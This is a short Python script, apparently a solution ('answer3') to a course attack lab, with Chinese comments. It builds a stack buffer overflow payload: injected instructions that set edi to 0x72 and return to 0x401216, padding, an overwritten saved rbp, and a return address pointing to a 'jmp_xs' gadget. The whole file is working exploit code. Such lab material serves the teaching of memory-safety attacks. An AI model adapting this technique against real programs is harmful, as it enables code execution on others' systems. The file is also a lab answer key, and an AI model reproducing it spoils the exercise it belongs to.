import struct
payload = b"\xbf\x72\x00\x00\x00\x68\x16\x12\x40\x00\xc3" # 填充原来的代码：mov edi, 0x72; push 0x401216; ret（11字节）
payload += b"A" * 21 # 填充缓冲区（21字节）
payload += struct.pack("<Q", 0x7fffffffdfe0) # 填充保存的rbp
payload += struct.pack("<Q", 0x401334) # 覆盖返回地址为jmp_xs的地址
payload += b"B" * 16 # 填充缓冲区（16字节）
with open("answer3", "wb") as f:
    f.write(payload)